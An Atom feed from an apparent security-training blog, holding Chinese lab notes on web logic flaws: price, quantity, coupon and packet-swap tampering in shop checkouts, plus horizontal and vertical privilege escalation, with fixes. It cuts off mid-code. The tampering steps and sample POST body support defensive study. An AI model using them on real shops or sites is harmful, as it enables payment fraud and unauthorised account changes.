<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ai潼</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-03-07T14:35:50.970Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>pwy</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Day50 WEB攻防-通用漏洞&amp;购买支付逻辑&amp;数据篡改&amp;请求重放&amp;接口替换</title>
    <link href="http://example.com/2023/02/24/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/"/>
    <id>http://example.com/2023/02/24/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/</id>
    <published>2023-02-24T05:24:52.000Z</published>
    <updated>2023-03-07T14:35:50.970Z</updated>
    
    <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、商品购买-数量&amp;价格&amp;编号等</p><p>2、支付模式-状态&amp;接口&amp;负数等</p><p>3、折扣处理-优惠券&amp;积分&amp;重放等</p><h3 id="详细点："><a href="#详细点：" class="headerlink" title="#详细点："></a>#详细点：</h3><p>1、熟悉常见支付流程</p><p>选择商品和数量-选择支付及配送方式-生成订单编号-订单支付选择-完成支付</p><p>2、熟悉那些数据篡改</p><p>商品编号ID，购买价格，购买数量，支付方式，订单号，支付状态等</p><p>3、熟悉那些修改方式</p><p>替换支付，重复支付，最小额支付，负数支付，溢出支付，优惠券支付等</p><h3 id="章节内容："><a href="#章节内容：" class="headerlink" title="#章节内容："></a>#章节内容：</h3><p>1、权限相关-越权&amp;访问控制&amp;未授权访问等</p><p>2、购买支付-数据篡改&amp;支付模式&amp;其他折扣等</p><p>3、下节课</p><p>4、下节课</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ 数据篡改-价格&amp;数量&amp;产品</p><p>➢ 修改方式-订单号&amp;数量&amp;优惠券</p><p>➢ 某实例-演示站交易支付逻辑安全</p><p>➢ 代码审计-业务支付逻辑&amp;安全修复</p><h3 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h3><h5 id="数据篡改-价格-amp-数量-amp-产品"><a href="#数据篡改-价格-amp-数量-amp-产品" class="headerlink" title="#数据篡改-价格&amp;数量&amp;产品"></a>#数据篡改-价格&amp;数量&amp;产品</h5><p>1、修改数量达到价格变动</p><p>2、修改单价达到价格变动</p><p>3、修改产品达到低价购买</p><p>4、修改接口达到成功购买</p><p>靶场：大米cms</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5NzU2NjI4,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"></p><p>点击购买大米手机cms</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5NzU2NjI4,size_16,color_FFFFFF,t_70-16772395304973.png" alt="在这里插入图片描述"></p><p>观察price&#x3D;5400对应价格，抓包将其修改</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5NzU2NjI4,size_16,color_FFFFFF,t_70-16772395978706.png" alt="在这里插入图片描述"></p><p>放包后发现价格变动了，成功修改价格</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5NzU2NjI4,size_16,color_FFFFFF,t_70-16772396271589.png" alt="在这里插入图片描述"></p><p>同样的，抓取购买大米测试产品的数据包</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230224195747044.png" alt="image-20230224195747044"></p><p>如果在修改数量和价格上面行不通(或者说商品不展示这些参数)，可以尝试以低价(5400)购买高价(6000)的物品，将数据包的关于商品信息的替换，替换除了此处以外的其东西</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230224201800675.png" alt="image-20230224201800675"></p><p>观察从6000变成了5400</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230224201927150.png" alt="image-20230224201927150"></p><p>还可以测试支付接口的地方，将vx，zfb接口改为自己私人支付接口(但是不一定成功)</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230224204836116.png" alt="image-20230224204836116"></p><p>下面数据包中的notify_url是支付宝的支付接口，尝试更改，此处不进行尝试</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230224205203855.png" alt="image-20230224205203855"></p><p>支付宝接口中return_url和notify_url的作用：(<a href="https://blog.csdn.net/KeleQAQ/article/details/111500581">https://blog.csdn.net/KeleQAQ/article/details/111500581</a>)</p><h5 id="修改方式-订单号-amp-数量-amp-优惠券"><a href="#修改方式-订单号-amp-数量-amp-优惠券" class="headerlink" title="#修改方式-订单号&amp;数量&amp;优惠券"></a>#修改方式-订单号&amp;数量&amp;优惠券</h5><p>靶场：niushop</p><p>1、修改数量达到价格变动</p><p>无价格可改，尝试改动数量</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230307194744046.png" alt="image-20230307194744046"></p><p>发包后价格改变</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230307194821374.png" alt="image-20230307194821374"></p><p>2、修改订单达到底价购买</p><p>3、优惠券重放使用&amp;重领使用</p><p>优惠券利用：</p><p>只能领取一次（找其规律，看是否每个优惠券都有一个序列id，用完一个会生产一个id值更大的）</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230307222035061.png" alt="image-20230307222035061"></p><p>重复使用-重放数据包（重复将这个优惠券的数据包重复发送）</p><p>防御的手段是：将优惠券编码加密，让攻击者猜不到，使用以后数据库进行删除</p><p>当没有优惠卷提交订单时：</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230307210351399.png" alt="image-20230307210351399"></p><p>post内容：goods_sku_list&#x3D;1%3A1&amp;leavemessage&#x3D;&amp;use_coupon&#x3D;0&amp;integral&#x3D;0&amp;account_balance&#x3D;0&amp;pay_type&#x3D;0&amp;buyer_invoice&#x3D;&amp;pick_up_id&#x3D;0&amp;express_company_id&#x3D;1</p><p>当使用优惠券时：<img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230307210334233.png" alt="image-20230307210334233"></p><p>post内容：goods_sku_list&#x3D;1%3A1&amp;leavemessage&#x3D;&amp;use_coupon&#x3D;1&amp;integral&#x3D;0&amp;account_balance&#x3D;0&amp;pay_type&#x3D;0&amp;buyer_invoice&#x3D;&amp;pick_up_id&#x3D;0&amp;express_company_id&#x3D;1</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230307210425866.png" alt="image-20230307210425866"></p><p>其中&amp;use_coupon&#x3D;参数代表是否使用了优惠券</p><p>没有优惠券后，将0改为1</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230307211240231.png" alt="image-20230307211240231"></p><p>价格少了1000</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230307211318559.png" alt="image-20230307211318559"></p><p>当用完了优惠券时，而上一张优惠券的id是4</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230307221348703.png" alt="image-20230307221348703"></p><p>可以在没有优惠券的情况下修改&amp;use_coupon&#x3D;6</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230307221553239.png" alt="image-20230307221553239"></p><p>修改后发包发现价格同样减少</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230307221646125.png" alt="image-20230307221646125"></p><p>同样存在，以低价格购买高价格，如将订单10000块和1000的数据包抓取</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230307223438661.png" alt="image-20230307223438661"></p><p>   将10000的数据包和1000的替换</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230307223322702.png" alt="image-20230307223322702"></p><p>最后支付价格变成了1000</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230307223539620.png" alt="image-20230307223539620"></p><h5 id="某实例-演示站交易支付逻辑安全"><a href="#某实例-演示站交易支付逻辑安全" class="headerlink" title="#某实例-演示站交易支付逻辑安全"></a>#某实例-演示站交易支付逻辑安全</h5><h5 id="代码审计-业务支付逻辑-amp-安全修复"><a href="#代码审计-业务支付逻辑-amp-安全修复" class="headerlink" title="#代码审计-业务支付逻辑&amp;安全修复"></a>#代码审计-业务支付逻辑&amp;安全修复</h5><p>1、金额以数据库定义为准</p><p>2、购买数量限制为正整数</p><p>3、优惠券固定使用后删除</p><p>4、订单生成后检测对应值</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;知识点：&quot;&gt;&lt;a href=&quot;#知识点：&quot; class=&quot;headerlink&quot; title=&quot;#知识点：&quot;&gt;&lt;/a&gt;#知识点：&lt;/h3&gt;&lt;p&gt;1、商品购买-数量&amp;amp;价格&amp;amp;编号等&lt;/p&gt;
&lt;p&gt;2、支付模式-状态&amp;amp;接口&amp;amp;负数等&lt;/p&gt;</summary>
      
    
    
    
    <category term="Web攻防" scheme="http://example.com/categories/Web%E6%94%BB%E9%98%B2/"/>
    
    
  </entry>
  
  <entry>
    <title>Day49 WEB攻防-通用漏洞&amp;业务逻辑&amp;水平垂直越权&amp;访问控制&amp;脆弱验证</title>
    <link href="http://example.com/2023/02/03/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/"/>
    <id>http://example.com/2023/02/03/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/</id>
    <published>2023-02-02T17:53:34.000Z</published>
    <updated>2023-02-24T06:20:09.322Z</updated>
    
    <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、水平越权-同级用户权限共享</p><p>2、垂直越权-低高用户权限共享</p><p>3、访问控制-验证丢失&amp;取消验证</p><p>4、脆弱验证-Cookie&amp;Token&amp;Jwt等</p><h3 id="前置知识："><a href="#前置知识：" class="headerlink" title="#前置知识："></a>#前置知识：</h3><h4 id="1、逻辑越权原理"><a href="#1、逻辑越权原理" class="headerlink" title="1、逻辑越权原理-"></a>1、逻辑越权原理-</h4><p>-水平越权：用户信息获取时未对用户与ID比较判断直接查询等</p><p>-垂直越权：数据库中用户类型编号接受篡改或高权限操作未验证等</p><h4 id="2、访问控制原理"><a href="#2、访问控制原理" class="headerlink" title="2、访问控制原理-"></a>2、访问控制原理-</h4><p>-验证丢失：未包含引用验证代码文件等</p><p>-取消验证：支持空口令,匿名,白名单等</p><h4 id="3、脆弱验证原理"><a href="#3、脆弱验证原理" class="headerlink" title="3、脆弱验证原理-"></a>3、脆弱验证原理-</h4><p>-Cookie&amp;Token&amp;Jwt：不安全的验证逻辑等</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/0.png" alt="img"></p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p> ➢ 权限-水平越权-YXCMS-检测数据比对弱</p><p>➢ 权限-垂直越权-MINICMS-权限操作无验证</p><p>➢ 未授权-访问控制-XHCMS-代码未引用验证</p><p>➢ 未授权-脆弱机制-XHCMS-Cookie脆弱验证</p><p>➢ 弱机制-空口令机制-Redis&amp;Weblogic弱机制</p><p>➢ 检测类-工具项目-Authz&amp;Secscan-Authcheck</p><h3 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h3><h4 id="权限-水平越权-YXCMS-检测数据比对弱"><a href="#权限-水平越权-YXCMS-检测数据比对弱" class="headerlink" title="#权限-水平越权-YXCMS-检测数据比对弱"></a>#权限-水平越权-YXCMS-检测数据比对弱</h4><p>只检测用户和ID对应关系，没检测当前操作用户是不是当前用户</p><p>环境靶场：YXCMS</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/image-20230221213349543.png" alt="image-20230221213349543"></p><p>进入会员中心</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/image-20230221213446404.png" alt="image-20230221213446404"></p><p>点击修改信息，用burp抓包，更改信息为别的用户，如数据库中的xiaodi002用户，并更改相关信息，id不知道的情况下可以猜测</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/image-20230221213824477.png" alt="image-20230221213824477"></p><p>查看原始数据库中的信息，原本xiaodi002的相关的信息</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/image-20230221213544894.png" alt="image-20230221213544894"></p><p>burpsuite改完发包成功</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/image-20230221214157953.png" alt="image-20230221214157953">刷新数据库，发现数据库中的xiaodi002用户信息被修改了为了burp中修改的数据，实现了水平越权</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/image-20230221214309835.png" alt="image-20230221214309835"></p><p>漏洞原因：</p><p>在源码中找到用户名参数并跟踪nickname,发现接收的nickname 不是固定用户名，而是可变变量</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/image-20230221220557785.png" alt="image-20230221220557785"></p><h4 id="权限-垂直越权-MINICMS-权限操作无验证"><a href="#权限-垂直越权-MINICMS-权限操作无验证" class="headerlink" title="#权限-垂直越权-MINICMS-权限操作无验证"></a>#权限-垂直越权-MINICMS-权限操作无验证</h4><p>后台数据包访问先执行后判断登录等于无效</p><p>1、有验证 逻辑顺序搞错了</p><p>此处的漏洞原因是2</p><p>环境靶场：minicms</p><p>发布一篇文章</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/image-20230221234220860.png" alt="image-20230221234220860"></p><p>复制回收(删除)文章的链接地址</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/image-20230221234315010.png" alt="image-20230221234315010"></p><p>用另一个浏览器打开登录地址，但是未登录</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/image-20230221234443265.png" alt="image-20230221234443265"></p><p>粘贴访问回收的地址，发现刚才发布的1111文章被删除了，实现了垂直越权</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/image-20230221234532508.png" alt="image-20230221234532508"></p><h6 id="漏洞成因分析审计："><a href="#漏洞成因分析审计：" class="headerlink" title="漏洞成因分析审计："></a>漏洞成因分析审计：</h6><p>主要的问题就在于权限判断是在head.php：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">ini_set</span>(<span 